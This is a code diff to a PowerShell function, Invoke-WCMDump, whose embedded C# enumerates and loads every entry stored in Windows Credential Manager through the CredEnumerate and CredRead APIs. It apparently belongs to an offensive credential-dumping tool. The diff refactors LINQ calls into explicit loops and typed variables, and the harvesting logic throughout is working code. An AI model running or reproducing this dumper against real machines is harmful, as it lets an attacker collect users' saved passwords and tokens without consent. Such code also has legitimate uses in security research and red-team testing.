@@ -21,14 +21,12 @@ function Invoke-WCMDump
             PersistenceType  : Enterprise
       #>
 
-
     $source = @"
     // C# modified from https://github.com/spolnik/Simple.CredentialsManager
 
     using Microsoft.Win32.SafeHandles;
     using System;
     using System.Collections.Generic;
-    using System.Linq;
     using System.Runtime.InteropServices;
     using System.Security.Permissions;
 
@@ -116,11 +114,11 @@ function Invoke-WCMDump
 
             IntPtr credPointer;
 
-            var result = NativeMethods.CredRead(Target, Type, 0, out credPointer);
+            Boolean result = NativeMethods.CredRead(Target, Type, 0, out credPointer);
             if (!result)
                 return false;
 
-            using (var credentialHandle = new NativeMethods.CriticalCredentialHandle(credPointer))
+            using (NativeMethods.CriticalCredentialHandle credentialHandle = new NativeMethods.CriticalCredentialHandle(credPointer))
             {
                 LoadInternal(credentialHandle.GetCredential());
             }
@@ -131,10 +129,18 @@ function Invoke-WCMDump
         public static IEnumerable<Credential> LoadAll()
         {
             UnmanagedCodePermission.Demand();
+            
+            IEnumerable<NativeMethods.CREDENTIAL> creds = NativeMethods.CredEnumerate();
+            List<Credential> credlist = new List<Credential>();
+            
+            foreach (NativeMethods.CREDENTIAL cred in creds)
+            {
+                Credential fullCred = new Credential(cred.UserName, null, cred.TargetName, (CredentialType)cred.Type);
+                if (fullCred.Load())
+                    credlist.Add(fullCred);
+            }
 
-            return NativeMethods.CredEnumerate()
-                .Select(c => new Credential(c.UserName, null, c.TargetName, (CredentialType)c.Type))
-                .Where(c => c.Load());
+            return credlist;
         }
 
         internal void LoadInternal(NativeMethods.CREDENTIAL credential)
@@ -186,16 +192,20 @@ function Invoke-WCMDump
         {
             int count;
             IntPtr pCredentials;
-            var ret = CredEnumerate(null, 0, out count, out pCredentials);
+            Boolean ret = CredEnumerate(null, 0, out count, out pCredentials);
 
             if (ret == false)
                 throw new Exception("Failed to enumerate credentials");
 
-            var credentials = new IntPtr[count];
-            for (var n = 0; n < count; n++)
-                credentials[n] = Marshal.ReadIntPtr(pCredentials, n * Marshal.SizeOf(typeof(IntPtr)));
+            List<CREDENTIAL> credlist = new List<CREDENTIAL>();
+            IntPtr credential = new IntPtr();
+            for (int n = 0; n < count; n++)
+            {
+                credential = Marshal.ReadIntPtr(pCredentials, n * Marshal.SizeOf(typeof(IntPtr)));
+                credlist.Add((CREDENTIAL)Marshal.PtrToStructure(credential, typeof(CREDENTIAL)));
+            }
 
-            return credentials.Select(ptr => (CREDENTIAL)Marshal.PtrToStructure(ptr, typeof(CREDENTIAL)));
+            return credlist;
         }
 
         internal sealed class CriticalCredentialHandle : CriticalHandleZeroOrMinusOneIsInvalid
